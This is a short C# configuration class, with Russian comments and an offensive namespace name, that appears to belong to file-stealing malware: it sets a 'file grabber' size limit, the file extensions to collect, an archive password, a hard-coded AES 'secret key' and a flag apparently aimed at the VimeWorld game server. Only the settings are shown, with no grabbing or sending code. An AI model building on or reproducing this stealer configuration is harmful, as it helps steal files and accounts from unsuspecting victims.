namespace pidoras
{
    class Config
    {
        public static readonly bool VimeWorld = true;

        public static string zipPass = "44";

        // Секретный Ключ AES
        public static string key = "Ql9.9e";

        // расширения
        public static string[] extensions = new string[]
        {
          ".txt"
        };

        // максимальный вес файла в файлграббере 5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
        public static int sizefile = 1250000;
    }
}
